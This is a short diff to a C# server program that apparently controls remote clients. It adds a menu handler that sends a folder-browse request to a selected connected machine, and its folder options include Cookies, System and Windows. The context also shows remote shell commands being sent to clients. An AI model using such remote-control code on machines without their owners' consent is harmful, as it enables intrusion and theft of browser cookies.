@@ -249,5 +249,46 @@ namespace Server
             clientSocket.Send(shellCommandPackage.ToByteArray());
         }
 
+        private void pretražiToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int pathId = 0;
+            switch (cbPath.Text)
+            {
+                case "Desktop":
+                    pathId = 0;
+                    break;
+                case "MyDocuments":
+                    pathId = 1;
+                    break;
+                case "MyPictures":
+                    pathId = 2;
+                    break;
+                case "MyVideos":
+                    pathId = 3;
+                    break;
+                case "ProgramFiles":
+                    pathId = 4;
+                    break;
+                case "ProgramFilesX86":
+                    pathId = 5;
+                    break;
+                case "System":
+                    pathId = 6;
+                    break;
+                case "UserProfile":
+                    pathId = 7;
+                    break;
+                case "Windows":
+                    pathId = 8;
+                    break;
+                case "Cookies":
+                    pathId = 9;
+                    break;
+            }
+            PathPackage pathPackage = new PathPackage(pathId);
+            var selectedRowIndex = connectionList.SelectedCells[0].RowIndex;
+            var clientSocket = PacketHandler.clientList.ElementAt(selectedRowIndex).clientSocket;
+            clientSocket.Send(pathPackage.ToByteArray());
+        }
     }
 }
